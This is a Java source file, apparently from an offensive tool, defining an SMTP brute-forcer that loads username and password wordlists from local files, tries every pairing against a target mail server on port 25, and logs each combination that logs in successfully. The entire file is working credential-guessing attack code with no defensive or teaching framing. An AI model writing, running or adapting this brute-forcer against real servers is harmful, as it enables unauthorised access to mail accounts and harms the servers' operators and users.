package action.bruter;

import global.GlobalSetting;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Properties;

import javax.mail.Session;
import javax.mail.Transport;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.smtp.SMTPClient;

import ch.ethz.ssh2.Connection;
import tools.Logger;

public class SmtpBruter {
	public static final int DEFAULT_PORT = 25;
	private static ArrayList<String> userlist = new ArrayList<String>();
	private static ArrayList<String> passlist = new ArrayList<String>();
	private static Properties props = null;
	
	public void run(String target) {
		if (!getUserPass()) {
			Logger.getInstance().insertLog("Error", "SmtpBruter getUserPass error!");
			return;
		}
		
		props = new Properties(); 
		props.setProperty("mail.smtp.auth", "true"); 
		props.setProperty("mail.transport.protocol", "smtp"); 
		
		for (int i=0; i<userlist.size(); i++)
			for (int j=0; j<passlist.size(); j++) 
				checkLogin(target, userlist.get(i), passlist.get(j));
	}
	
	private void checkLogin(String target, String username, String password) {
		try {
			Session session = Session.getInstance(props); 
			Transport transport = session.getTransport(); 
			transport.connect(target, DEFAULT_PORT, username, password);
			transport.close();
			
			Logger.getInstance().insertResult(target+":"+username+":"+password);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			return;
		}
	}
	
	private boolean getUserPass() {
		if (userlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\smtp_user.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	userlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}	
		}
		
		if (passlist.size() == 0) {
			File directory = new File("");
			String courseFile = "";
			try {
				courseFile = directory.getCanonicalPath();
			} catch (IOException e) {
				return false;
			}
			
			String fileName = courseFile+"\\options\\smtp_pass.txt";
			FileInputStream fis = null;
			InputStreamReader isr = null;
			BufferedReader br = null;
			try {
				String str = "";
				fis = new FileInputStream(fileName);
			    isr = new InputStreamReader(fis);
			    br = new BufferedReader(isr);
			    while ((str = br.readLine()) != null) {
			    	passlist.add(str);
			    }
			} catch (FileNotFoundException e) {
				return false;
			} catch (IOException e) {
				return false;
			} finally {
				try {
					br.close();
					isr.close();
					fis.close();
				} catch (IOException e) {
					return false;
				}
			}
		}
		
		return true;
	}
}
